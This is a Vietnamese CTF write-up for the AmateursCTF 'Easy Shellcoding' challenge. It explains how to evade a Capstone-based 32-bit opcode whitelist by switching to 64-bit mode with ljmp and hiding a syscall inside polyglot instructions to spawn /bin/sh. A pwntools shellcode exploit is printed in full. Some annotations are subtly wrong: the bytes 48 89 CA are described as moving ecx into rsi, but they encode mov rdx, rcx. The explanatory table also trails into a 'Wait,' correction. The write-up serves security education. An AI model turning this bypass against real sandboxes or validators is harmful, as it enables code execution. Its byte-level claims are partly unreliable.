# Writeup: AmateursCTF - Easy Shellcoding
**Category:** Pwn / Shellcoding
**Difficulty:** Medium (Thực tế là Hard cho người mới vì phải dùng kỹ thuật Mode Switching)

## 1. Phân tích đề bài (Reconnaissance)

Chúng ta được cung cấp một file `chal.py`. Đây là một chương trình Python đóng vai trò là "Cảnh sát" (Validator) và "Người vận chuyển" (Loader).

### Nhiệm vụ:
Bạn phải nhập vào một chuỗi **Shellcode** (mã máy dưới dạng Hex). Chương trình sẽ kiểm tra shellcode này, và nếu nó thấy "hợp lệ", nó sẽ chạy shellcode đó. Mục tiêu là chiếm quyền điều khiển hệ thống (lấy shell `/bin/sh`) để đọc file `flag`.

### Rào cản (The Constraints):
Chương trình `chal.py` sử dụng thư viện **Capstone** để dịch ngược (disassemble) shellcode của bạn từ mã máy sang ngôn ngữ Assembly (32-bit) để kiểm tra.

1.  **Danh sách lệnh cho phép (Whitelist):** Chỉ được dùng các lệnh: `jmp`, `add`, `mov`, `sub`, `inc`, `dec`, `cmp`, `push`, `pop`, `int3`.
2.  **Cấm lệnh nhảy bậy:** Nếu dùng `jmp`, phải nhảy vào đúng đầu một lệnh khác (không được nhảy vào giữa thân lệnh để giấu mã).
3.  **Thiếu vắng lệnh quan trọng:** Để lấy shell, ta cần gọi Hệ điều hành (System Call). Trên 32-bit, lệnh đó là `int 0x80`. Nhưng lệnh `int` **KHÔNG** nằm trong danh sách cho phép (ngoại trừ `int3`).

### Vấn đề nan giải:
*   Ta cần gọi `execve("/bin/sh")` để có shell.
*   Để gọi nó, ta cần lệnh `int 0x80` (hoặc `syscall`).
*   Validator cấm `int`.
*   Ta không thể tự sửa code lúc chạy (Self-Modifying Code) vì vùng nhớ bị **Read-Only** (Chỉ đọc).

=> **Làm sao để chạy một lệnh bị cấm mà Validator không phát hiện ra?**

---

## 2. Ý tưởng giải quyết: "Đổi kính chiếu yêu" (Mode Switching)

Hãy tưởng tượng CPU giống như một người đeo kính để đọc sách.
*   **Kính 32-bit (Validator đang đeo):** Nhìn chuỗi byte `48` là lệnh `dec eax`.
*   **Kính 64-bit (CPU hiện đại):** Nhìn chuỗi byte `48` chỉ là một tiền tố (prefix) vô nghĩa.

Môi trường bài thi chạy trên Ubuntu 64-bit, nhưng chương trình được biên dịch ở dạng 32-bit. Tuy nhiên, CPU vẫn hỗ trợ cả hai chế độ.

**Chiến thuật:**
1.  Viết code giả dạng là 32-bit "ngoan hiền" để vượt qua Validator.
2.  Sử dụng lệnh đặc biệt **`ljmp` (Long Jump)** để ép CPU chuyển từ chế độ 32-bit sang 64-bit ngay khi chương trình đang chạy.
3.  Khi sang 64-bit, cách CPU đọc mã máy sẽ thay đổi. Chúng ta sẽ lợi dụng sự khác biệt này để giấu lệnh `syscall` (`0F 05`) bên trong bụng của các lệnh 32-bit hợp lệ. Kỹ thuật này gọi là **Polyglot Shellcode**.

---

## 3. Chi tiết kỹ thuật (The Exploitation)

### Bước 1: Chuẩn bị thanh ghi (Setup)
Trước khi chuyển nhà sang 64-bit, ta tận dụng môi trường 32-bit để thiết lập các tham số cho hàm `execve("/bin/sh", 0, 0)`.

*   Đẩy chuỗi `"/bin///sh"` vào Stack.
*   Lưu địa chỉ chuỗi đó vào `ebx`.
*   Xóa `ecx`, `edx` (tham số 0).
*   Quan trọng: Đặt `eax = 59`. (Trong 64-bit, 59 là mã của lệnh `execve`. Trong 32-bit là 11, nhưng ta sắp sang 64-bit nên phải dùng số 59).

### Bước 2: Chuyển hệ (The Switch)
Lệnh `ljmp` (Long Jump) cho phép ta thay đổi **Code Segment (CS)**.
*   CS mặc định của 32-bit: `0x23`.
*   CS của 64-bit trên Linux: `0x33`.

Lệnh: `ljmp 0x33, [Địa chỉ dòng lệnh tiếp theo]`
Mã hex: `EA [Address] 33 00`.
May mắn là `jmp` (bao gồm `ljmp`) nằm trong danh sách cho phép!

### Bước 3: Ảo ảnh Polyglot (The Illusion) - Phần khó nhất
Sau khi nhảy, CPU chạy ở 64-bit, nhưng Validator (Python) vẫn đang nhìn code dưới dạng 32-bit để kiểm tra.

Ta cần thực thi lệnh **`syscall`** (Mã máy: `0F 05`).
Nhưng nếu viết `0F 05` ra, Validator 32-bit sẽ thấy và chặn.

**Giải pháp:** Giấu `0F 05` vào bên trong một lệnh `mov` khổng lồ của 64-bit.

Hãy xem bảng so sánh dưới đây cho chuỗi byte chúng ta tạo ra:
`48 BB 90 90 90 90 3D 90 90 90 0F 05 90 90 90 90`

| Byte Hex | Validator nhìn (32-bit) | CPU chạy (64-bit) |
| :--- | :--- | :--- |
| `48` | `dec eax` (Giảm eax 1 đơn vị - Hợp lệ) | **REX Prefix** (Vô hại, báo hiệu lệnh 64-bit) |
| `BB` | `mov ebx, ...` (Bắt đầu lệnh mov - Hợp lệ) | **`mov rbx, ...`** (Bắt đầu lệnh mov 64-bit) |
| `90`...`90` | (Dữ liệu của lệnh mov 32-bit) | (Dữ liệu rác...) |
| `3D` | **`cmp eax, ...`** (Lệnh so sánh - Hợp lệ) | (...vẫn đang nằm trong bụng lệnh `mov rbx`...) |
| `90`...`90` | (Dữ liệu so sánh...) | (...vẫn là rác...) |
| `0F` | (Byte cuối của dữ liệu so sánh - Vô hại) | (...Byte cuối của dữ liệu rác) |
| **`05`** | **`add eax, ...`** (Lệnh cộng - Hợp lệ) | **HẾT LỆNH MOV.** CPU đọc lệnh tiếp theo. |

Wait, chỗ `0F 05` hoạt động như sau:
1.  Ở 64-bit, lệnh `mov rbx, [8 bytes immediate]` nó "nuốt" hết 8 bytes sau nó.
2.  Chuỗi byte `90 90 90 90 3D 90 90 90` là 8 byte đó.
3.  Byte tiếp theo là `0F`. Byte sau nữa là `05`.
4.  CPU 64-bit ghép lại: **`0F 05` -> `SYSCALL`**.

Ở góc nhìn 32-bit (Validator):
1.  Nó thấy `cmp eax, ...` (Opcode `3D`). Lệnh này ăn 4 byte tiếp theo.
2.  4 byte đó là `90 90 90 0F`.
3.  Validator thấy hợp lệ.
4.  Lệnh tiếp theo bắt đầu bằng `05`. Đó là `add eax, ...`. Cũng hợp lệ.

=> **Kết quả:** Validator thấy một chuỗi lệnh vô nghĩa nhưng hợp lệ (`dec`, `mov`, `cmp`, `add`). Còn CPU 64-bit thì thấy `mov rbx` (vô nghĩa) sau đó là cú sút quyết định `syscall`.

---

## 4. Giải thích Code (Python)

```python
# === 1. SETUP 32-BIT ===
# Chuẩn bị mọi thứ ở chế độ 32-bit vì ta dễ viết hơn
setup = asm('''
    /* Xóa eax */
    sub eax, eax
    /* Đẩy chuỗi /bin///sh vào stack */
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp  /* ebx lưu địa chỉ chuỗi /bin/sh */
    
    /* Xóa các tham số khác */
    sub ecx, ecx
    sub edx, edx
    
    /* Quan trọng: eax = 59. Đây là số hiệu syscall execve của 64-bit */
    push 59
    pop eax
''')

# === 2. LJMP TO 64-BIT ===
# Tính toán địa chỉ đích đến để nhảy
offset_ljmp = 7
target_addr = base + header_size + len(setup) + offset_ljmp

# Câu thần chú chuyển hệ: CS = 0x33
ljmp = b'\xea' + p32(target_addr) + b'\x33\x00'

# === 3. 64-BIT ADAPTER ===
# Khi nhảy sang 64-bit, tên các thanh ghi thay đổi.
# Syscall 64-bit dùng RDI (tham số 1) và RSI (tham số 2).
# Code cũ của ta để ở EBX và ECX. Ta cần chuyển qua.
# Byte 48 89 DF: Ở 32-bit là "dec eax; mov edi, ebx".
#                Ở 64-bit là "mov rdi, rbx".
adapter = b'\x48\x89\xdf' # ebx -> rdi
adapter += b'\x48\x89\xca' # ecx -> rsi

# === 4. POLYGLOT SYSCALL ===
polyglot = b''
polyglot += b'\x48'     # 64-bit: Prefix / 32-bit: dec eax
polyglot += b'\xBB'     # 64-bit: mov rbx, imm64
polyglot += b'\x90'*4   # Padding rác

# Trick đánh lừa Validator:
polyglot += b'\x3D'     # 32-bit: cmp eax, imm32 (Lệnh này nuốt 4 byte sau)
polyglot += b'\x90'*3   # Padding rác
polyglot += b'\x0F'     # Byte cuối của cmp 32-bit / Byte đầu của SYSCALL 64-bit

# Cú chốt:
polyglot += b'\x05'     # 32-bit: add eax (lệnh mới) / 64-bit: byte sau của SYSCALL
polyglot += b'\x90'*4   # Operand cho lệnh add 32-bit
```

---

## 5. Tổng kết
Bài này dạy chúng ta rằng:
1.  **Validator chỉ kiểm tra tĩnh:** Nó chỉ nhìn code trước khi chạy, nó không biết CPU thực sự sẽ chạy thế nào.
2.  **Kiến trúc máy tính rất linh hoạt:** Một chuỗi byte có thể là lệnh này ở chế độ này, nhưng là lệnh khác ở chế độ khác.
3.  **Tư duy Hacker:** Khi bị cấm đi cửa chính (`int 0x80`), hãy tìm cửa sổ (`ljmp` sang 64-bit) và ngụy trang (`Polyglot`) để lẻn vào.